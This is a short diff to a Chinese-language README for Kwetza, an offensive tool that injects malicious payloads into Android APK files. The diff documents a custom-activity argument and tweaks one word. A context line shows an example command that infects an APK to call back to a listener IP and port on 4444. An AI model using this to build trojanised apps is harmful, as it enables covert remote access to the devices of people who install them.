@@ -39,6 +39,8 @@ python kwetza.py nameOfTheApkToInfect.apk https/tcp LHOST LPORT yes/no customCla
 
 * yes/no = 选择yes则会添加额外的权限，选择no则会利用app原来的权限
 
+* customClass = 如果希望Kwetza注入到此活动，请在此处指定自定义活动。
+
 ```
 python kwetza.py hackme.apk https 10.42.0.118 4444 yes com.moo.another.activity
 [+] MMMMMM KWETZA
@@ -78,7 +80,7 @@ jar signed.
 
 
 # 信息
-Kwetza以Python 2开发。
+Kwetza以Python2开发。
 
 Kwetza默认会使用payload文件夹下的模板和keystore在apk中植入恶意payload。
 
